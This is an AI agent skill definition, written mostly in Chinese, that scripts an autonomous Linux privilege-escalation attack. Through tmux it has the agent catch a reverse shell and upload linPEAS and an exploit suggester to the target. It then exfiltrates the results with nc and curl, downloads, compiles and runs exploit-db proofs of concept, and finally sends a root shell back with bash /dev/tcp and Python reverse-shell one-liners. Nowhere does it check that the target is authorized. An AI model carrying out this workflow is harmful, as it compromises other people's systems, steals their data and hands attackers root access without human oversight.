---
name: linux-privesc-linpeas
description: "Dynamic Linux privilege escalation: receive reverse shell → upload linPEAS/exploit-suggester → auto-detect CVEs → test matching exploits → deliver root shell."
allowed-tools:
  - exec
  - read
  - write
  - cron
  - web_fetch
  - web_search
  - process
  - sessions_spawn
  - sessions_send
  - sessions_yield
user-invocable: true
---

# Linux PrivEsc via linPEAS + CVE Exploit

端到端 Linux 提权辅助技能。每次运行都会**动态探测目标**，根据目标内核版本和配置自动匹配可用 CVE，不预制任何固定漏洞信息。

## 核心设计

```
目标反弹 shell (6767)
       ↓
  tmux 管理 socat 监听 → 全部交互走 tmux send-keys
       ↓
  ┌─ 动态探测 ──────────────────────────┐
  │  上传 linPEAS → 收集系统信息          │
  │  上传 linux-exploit-suggester → CVE  │
  │  匹配目标内核/发行版/配置              │
  └──────────────┬──────────────────────┘
                 ↓
  ┌─ 动态下载 Exploit ──────────────────┐
  │  根据 suggetser 输出结果             │
  │  → 从 exploit-db 动态下载 PoC        │
  │  → 编译并执行                        │
  └──────────────┬──────────────────────┘
                 ↓
  ┌─ 提权成功 ──────────────────────────┐
  │  root shell → 用户自备 8989 监听     │
  └────────────────────────────────────┘
```

**关键原则：零硬编码 CVE。** 不对目标做任何预设，全部依赖目标机自身信息动态匹配。

## 交互方式

全部 shell 操作通过 tmux，不在前台建交互 shell：

```bash
# 创建会话
tmux new-session -d -s revshell
tmux send-keys -t revshell "socat TCP-LISTEN:6767,fork,reuseaddr -" Enter

# 发命令
tmux send-keys -t revshell "command" Enter

# 读输出
sleep 3
tmux capture-pane -t revshell -p -S -30
```

## 完整工作流

### 阶段一：部署环境（本机）

```bash
# 1. tmux + 6767 监听
tmux new-session -d -s revshell
tmux send-keys -t revshell \
  "socat TCP-LISTEN:6767,fork,reuseaddr -" Enter

# 2. HTTP 文件服务（提供探测工具）
cd /tmp
curl -sL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
curl -sL -o les.sh \
  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linpeas.sh les.sh
python3 -m http.server 8888 &

# 3. 提示用户开 8989 监听
echo "另开终端: nc -lvnp 8989   # 收 root shell"
```

### 阶段二：目标机接入

用户触发目标反弹 shell 到 6767。

### 阶段三：动态探测

```bash
# 3a. 基本信息
tmux send-keys -t revshell \
  "which wget curl python python3 nc gcc g++ 2>/dev/null; id; uname -a; cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null | head -3" Enter
sleep 3
tmux capture-pane -t revshell -p -S -20

# 3b. 上传 linPEAS 执行
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<本机IP>:8888/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee /tmp/peas-out.txt && echo '===PEAS_DONE==='" Enter
# 等待执行完成（30-60s）

# 3c. 取回 linPEAS 结果
nc -lvp 9996 > /tmp/target_peas.txt 2>/dev/null &
tmux send-keys -t revshell \
  "nc <本机IP> 9996 < /tmp/peas-out.txt && echo SENT || echo FAIL" Enter
sleep 10

# 3d. 上传 linux-exploit-suggester（动态 CVE 匹配）
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<本机IP>:8888/les.sh -O les.sh && chmod +x les.sh && ./les.sh | tee /tmp/les-out.txt && echo '===LES_DONE==='" Enter
sleep 10

# 3e. 取回 suggester 结果
nc -lvp 9995 > /tmp/target_les.txt 2>/dev/null &
tmux send-keys -t revshell \
  "nc <本机IP> 9995 < /tmp/les-out.txt && echo SENT || echo FAIL" Enter
sleep 10
```

### 阶段四：分析匹配 CVE

```bash
# linPEAS 分析
grep -iE 'CVE-[0-9]{4}' /tmp/target_peas.txt | sort -u

# exploit-suggester 分析（更全面）
cat /tmp/target_les.txt

# 自动分析脚本
python3 /root/.openclaw/plugin-skills/linux-privesc-linpeas/scripts/analyze_peas.py /tmp/target_peas.txt
```

从 suggetser 输出中提取可用 exploit 列表。重点关注：
- 标记为 `[CVE-xxx]` 且与内核版本匹配的条目
- 有 exploit-db 链接的（`http://www.exploit-db.com/exploits/xxxxx`）
- 有 GitHub PoC 链接的

### 阶段五：动态下载 & 编译 Exploit

根据 suggetser 输出，从 exploit-db 或 GitHub 下载对应 PoC：

```bash
# 在 suggetser 输出中找到 exploit-db ID，例如 37292
EXPLOIT_ID=37292  # ← 替换为实际匹配的 ID

# 下载 PoC 到本机 HTTP 目录
curl -sL -o /tmp/poc.c "https://www.exploit-db.com/raw/$EXPLOIT_ID"

# 上传到目标机编译执行
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<本机IP>:8888/poc.c -O exploit.c && gcc exploit.c -o exploit && ./exploit && id || echo FAIL" Enter
sleep 5
tmux capture-pane -t revshell -p -S -10
```

如果 PoC 需要特殊编译参数（如 `-pthread -lcrypt` 或 Python 脚本），按 PoC 注释调整。

### 阶段六：反转 root shell

提权成功 → `#` 提示符出现后：

```bash
# 通知用户: 确认 8989 监听已开启
# bash（有 /dev/tcp）
tmux send-keys -t revshell "bash -i >& /dev/tcp/<本机IP>/8989 0>&1" Enter

# 或 python
tmux send-keys -t revshell \
  'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<本机IP>\",8989));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));subprocess.call([\"/bin/sh\",\"-i\"])"' Enter
```

## 传输文件

```bash
# 本机 → 目标：HTTP
python3 -m http.server 8888 &
wget http://<本机IP>:8888/filename

# 目标 → 本机：nc
nc -lvp 9996 > /tmp/out.txt &          # 本机
nc <本机IP> 9996 < /tmp/out.txt        # 目标

# 目标 → 本机：curl POST
python3 recv_post.py 9997 /tmp/out.txt # 本机
curl -X POST --data-binary @file http://<本机IP>:9997/upload  # 目标
```

## 安全注意事项

- 不预设任何特定 CVE，完全依赖动态检测
- 本机 IP 必须目标可达（`ip addr` 确认）
- 目标防火墙需放行 6767/8888/9996
- 8989 由用户自行监听，本工具只负责发送
- 某些 exploit 可能导致目标宕机，注意备份
